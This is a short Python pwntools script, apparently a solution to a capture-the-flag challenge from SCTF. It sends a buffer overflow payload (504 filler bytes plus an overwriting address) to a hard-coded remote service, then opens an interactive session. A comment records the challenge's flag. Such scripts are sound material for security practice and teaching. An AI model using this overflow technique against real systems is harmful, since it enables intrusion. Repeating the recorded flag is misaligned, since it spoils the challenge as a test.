#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
from pwn import *

# SCTF{Welcome_2_SCTF}
host = "58.213.63.30"
port = "60001" 

r = remote(host,port)

payload = "a"*(440+64)
payload += p64(0x600dc0)

r.recvuntil("flag?")
r.sendline(payload)

r.interactive()

